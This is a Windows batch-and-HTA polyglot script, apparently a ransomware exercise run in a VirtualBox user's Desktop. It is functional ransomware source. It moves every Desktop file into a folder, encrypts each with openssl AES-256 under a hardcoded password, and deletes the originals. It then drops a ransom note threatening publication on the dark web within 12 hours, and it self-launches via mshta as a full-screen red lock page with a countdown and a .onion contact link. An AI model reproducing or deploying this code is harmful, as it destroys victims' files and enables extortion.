<!-- Batch Section
@echo off
setlocal enabledelayedexpansion

REM @2023-CEVIK Meryem

REM Dossier source
set "source_folder=C:\Users\vboxuser\Desktop"

REM Dossier de destination
set "encrypted_folder=C:\Users\vboxuser\Desktop\encrypted"

REM Mot de passe pour le cryptage
set "mot_de_passe=HACK127_fOB0?a4?644x4aeR"

REM Création du dossier encrypted (s'il n'existe pas)
if not exist "%encrypted_folder%" mkdir "%encrypted_folder%"

REM Déplacement des fichiers depuis le dossier source vers le dossier encrypted (y compris les sous-dossiers)
for /r "%source_folder%" %%f in (*.*) do (
    move "%%f" "%encrypted_folder%\"
)

REM Cryptage des fichiers dans le dossier encrypted
for %%f in ("%encrypted_folder%\*.*") do (
    openssl enc -aes-256-cbc -salt -pass "pass:%mot_de_passe%" -in "%%f" -out "%%f.enc"
    del /q "%%f"
)

REM Création du fichier texte
echo YOUR FILES ARE ENCRYPTED BY HACK127 > "%source_folder%\readme.txt"
echo Don't worry, you can return all your files! >> "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo Install session messenger from this link : https://hack127.onion And chat with us. >> "%source_folder%\readme.txt"
echo Your ID is: 6768 >> "%source_folder%\readme.txt"
echo If you do not respond to us within 12 hours, your files will be published on the dark web. >> "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo Do not rename encrypted files. >> "%source_folder%\readme.txt"
echo Do not try to decrypt your data using third-party software, it may cause permanent data loss. >> "%source_folder%\readme.txt"

REM Fin du script
endlocal

REM Block Screen
cls
setlocal
for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"

-->
<html>
    <head>
        <title>Hack127</title>
    <hta:application id="oBVC" 
                     applicationname="BSOD"  
                     version="1.0" 
                     maximizebutton="yes" 
                     minimizebutton="yes" 
                     sysmenu="yes" 
                     Caption="yes" 
                     windowstate="maximize"/> 
    <style>
        #texto2{
            padding-top: 19%;
            letter-spacing: 1px;
            text-align: center;
        }
    </style>
    <script>
function startTimer() {
  var countDownDate = new Date().getTime() + 12 * 60 * 60 * 1000; // 12 heures en millisecondes

  var x = setInterval(function() {
    var now = new Date().getTime();
    var distance = countDownDate - now;

    var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));

    var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));

    var seconds = Math.floor((distance % (1000 * 60)) / 1000);

    document.getElementById("timer").innerHTML = hours + "h " + minutes + "m " + seconds + "s ";

    if (distance < 0) {
      clearInterval(x);
      document.getElementById("timer").innerHTML = "Temps écoulé";
    }
  }, 1000);
}

window.onload = startTimer; // Démarrer le timer lorsque la page est chargée
</script>
</head>

<body bgcolor="#8c1d1d" scroll="no">
    <font face="Lucida Console" size="4" color="white">
<center><p> - RansomWare - </p></center>
<div id="texto2">
    Your Files Have Been Encrypted by Hack127!<br><br>
    <br><br>
    If you want to restore them, follow this link: <a style="color:yellow;" href="http://hack127.onion" target="_blank">http://hack127.onion</a><br><br>
    <br><br>
    YOUR ID 6768 <br><br>
    <br><br>
    If you do not respond to us within 12 hours, your files will be published on the dark web.
    <br><br><br>
    <div id="timer"></div>
    <img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100">
</div>
</body>
</html>